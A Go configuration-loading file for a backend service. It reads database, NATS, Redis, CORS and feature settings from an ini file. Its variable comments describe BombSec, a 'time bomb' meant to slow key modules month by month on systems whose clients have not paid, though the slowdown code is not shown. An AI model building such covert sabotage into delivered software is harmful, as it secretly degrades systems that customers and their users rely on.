package Router2SystemConfig

import (
	"errors"
	"fmt"
	CoreCache "gitee.com/weeekj/weeekj_core/v5/core/cache"
	CoreFile "gitee.com/weeekj/weeekj_core/v5/core/file"
	CoreNats "gitee.com/weeekj/weeekj_core/v5/core/nats"
	CorePostgres "gitee.com/weeekj/weeekj_core/v5/core/postgres"
	CoreSQL2 "gitee.com/weeekj/weeekj_core/v5/core/sql2"
	"github.com/golang-module/carbon"
	"gopkg.in/ini.v1"
	"os"
	"strings"
)

//路由层级基础配置项
// 任意服务可以引用该设计，该设计不对任何外部模块通讯
// 只用于记录配置，完成引导的基本工作

var (
	//ServerName 服务器信息
	ServerName string
	ServerIP   string
	ServerPort string
	//ServicePIDName 进程名称
	ServicePIDName string
	//Debug debug
	Debug = false
	//RunInstall 是否启动安装包
	RunInstall = false
	//HeaderOrigin 头部
	HeaderOrigin = "*"
	//RouterHost 广播端口和地址
	// 这里建议为 127.0.0.1:8000，通过nginx映射端口
	RouterHost = ":9000"
	//PostgresURL postgres
	PostgresURL = ""
	//RootDir 根目录
	RootDir = CoreFile.BaseDir()
	//Cfg 配置项目
	Cfg *ini.File
	//GlobConfig 配置结构体
	GlobConfig GlobConfigType
	//MainDB 全局核心数据库
	MainDB CorePostgres.Client
	//MainCache 全局默认缓冲模块
	MainCache CoreCache.CacheData
	//MainSQL sql操作句柄
	MainSQL CoreSQL2.SQLClient
	//BombSec 定时炸弹
	// 用于解决交付客户不付款的问题，该设计将自动拖慢系统运行速度，但不会彻底中断服务
	// 默认设置为0不启动，启动后将在该时间基础上，按照所设定的月份x该倍数，随着时间递增每月将递增倍数
	// 只针对关键的模块做该处理，其他所有模块不做处理，例如用户领取会话等关键性内容
	BombSec int64 = 0
	// BombStartMonth 启动炸弹的最初时间
	BombStartMonth = carbon.Carbon{}
)

// Init 初始化
func Init() error {
	var err error
	//初始化服务名称
	ServerName, err = GetServerHostName()
	if err != nil {
		return errors.New("无法加载服务名称, " + err.Error())
	}
	//加载全局配置
	Cfg, err = ini.Load(fmt.Sprint(RootDir, CoreFile.Sep+"conf"+CoreFile.Sep, "conf.ini"))
	if err != nil {
		return err
	}
	//debug和基础配置
	Debug, err = Cfg.Section("core").Key("debug").Bool()
	if err != nil {
		return err
	}
	CoreSQL2.OpenDebug = Debug
	RunInstall, err = Cfg.Section("core").Key("run_install").Bool()
	if err != nil {
		return err
	}
	ServicePIDName = Cfg.Section("core").Key("now_pid_name").String()
	//路由设置
	HeaderOrigin = Cfg.Section("router").Key("header_origin").String()
	RouterHost = fmt.Sprint(":", Cfg.Section("router").Key("router_host").String())
	//链接数据库
	postgresqlOpen, _ := Cfg.Section("db").Key("postgresql_open").Bool()
	if postgresqlOpen {
		fmt.Println("wait connect postgresql...")
		PostgresURL = Cfg.Section("db").Key("postgresql_url").String()
		if err = LoadPostgres(); err != nil {
			return err
		}
		MainSQL.InitPostgresql(&MainDB)
	}
	//链接NATS
	natsOpen, _ := Cfg.Section("mid").Key("nats_open").Bool()
	if natsOpen {
		fmt.Println("wait connect nats...")
		natsURL := Cfg.Section("mid").Key("nats_url").String()
		if natsURL != "" {
			if err = CoreNats.Init(natsURL); err != nil {
				return err
			}
			CoreNats.SetSubPrefix(Cfg.Section("mid").Key("nats_prefix").String())
			fmt.Println("connect nats url: ", natsURL)
		}
	}
	//缓冲类型
	cacheSystem := Cfg.Section("cache").Key("cache_system").String()
	MainCache.Init(cacheSystem)
	switch cacheSystem {
	case "core":
	case "redis":
		//连接redis
		redisOpen, _ := Cfg.Section("mid").Key("redis_open").Bool()
		if redisOpen {
			fmt.Println("wait connect redis...")
			redisURL := Cfg.Section("mid").Key("redis_url").String()
			redisPassword := Cfg.Section("mid").Key("redis_password").String()
			redisDatabaseNum, _ := Cfg.Section("mid").Key("redis_database_num").Int()
			if redisDatabaseNum < 1 {
				redisDatabaseNum = 0
			}
			if err = MainCache.InitRedis(redisURL, redisPassword, redisDatabaseNum); err != nil {
				return errors.New(fmt.Sprint("connect redis failed, ", err))
			}
			fmt.Println("connect redis url: ", redisURL)
			//清理所有缓冲数据
			//clearCache, _ := Cfg.Section("cache").Key("cache_open_clear").Bool()
			//if clearCache {
			//	fmt.Println("clear redis all data.")
			//	MainCache.DeleteAll()
			//}
		}
	}
	//初始化配置结构
	GlobConfig = GlobConfigType{
		Router: GlobConfigRouterType{
			NeedTokenLog: false,
		},
		User: GlobConfigUserType{
			LoginViewPhone:        false,
			LoginViewEmail:        false,
			SyncUserPhoneUsername: false,
			ClientCostIntegral:    false,
		},
		Finance: GlobConfigFinanceType{
			NeedNoCheck: false,
		},
		Safe: GlobConfigSafeType{
			SafeRouterTimeBlocker: false,
		},
		Org: GlobConfigOrg{
			DefaultOpenFunc: nil,
		},
		ERP: GlobConfigERP{
			Warehouse: GlobConfigERPWarehouse{
				StoreLess0: false,
			},
		},
		Map: GlobConfigMap{
			MapOpen: false,
		},
		Service: GlobConfigService{
			InfoExchangeOrderFinishAutoDown: true,
		},
	}
	//会话
	GlobConfig.Router.NeedTokenLog, _ = Cfg.Section("router").Key("need_token_log").Bool()
	//第三方API
	GlobConfig.OtherAPI.OpenSyncWeather, _ = Cfg.Section("other_api").Key("open_sync_weather").Bool()
	GlobConfig.OtherAPI.OpenSyncHolidaySeason, _ = Cfg.Section("other_api").Key("open_sync_holiday_season").Bool()
	//用户
	GlobConfig.User.LoginViewPhone, _ = Cfg.Section("user").Key("login_user_view_phone").Bool()
	GlobConfig.User.LoginViewEmail, _ = Cfg.Section("user").Key("login_user_view_email").Bool()
	GlobConfig.User.SyncUserPhoneUsername, _ = Cfg.Section("user").Key("sync_user_phone_username").Bool()
	GlobConfig.User.ClientCostIntegral, _ = Cfg.Section("user").Key("client_cost_integral").Bool()
	GlobConfig.User.GlobShowUser, _ = Cfg.Section("user").Key("glob_show_user").Bool()
	//财务相关设置
	GlobConfig.Finance.NeedNoCheck, _ = Cfg.Section("finance").Key("finance_currency_no_check").Bool()
	//设置安全部分环境
	GlobConfig.Safe.SafeRouterTimeBlocker, _ = Cfg.Section("safe").Key("safe_router_time_blocker").Bool()
	//组织
	orgDefaultOpenFunc := Cfg.Section("org").Key("default_open_func").String()
	if orgDefaultOpenFunc != "" {
		GlobConfig.Org.DefaultOpenFunc = strings.Split(orgDefaultOpenFunc, ",")
	}
	//ERP
	// 仓储
	GlobConfig.ERP.Warehouse.StoreLess0, _ = Cfg.Section("erp_warehouse").Key("store_less_0").Bool()
	//地图
	GlobConfig.Map.MapOpen, _ = Cfg.Section("map").Key("open_map").Bool()
	//信息交互订单完成后，自动下架产品
	GlobConfig.Service.InfoExchangeOrderFinishAutoDown, _ = Cfg.Section("service").Key("info_exchange_order_finish_auto_down").Bool()
	//反馈
	return nil
}

// GetServerHostName 获取服务器名称
func GetServerHostName() (string, error) {
	return os.Hostname()
}
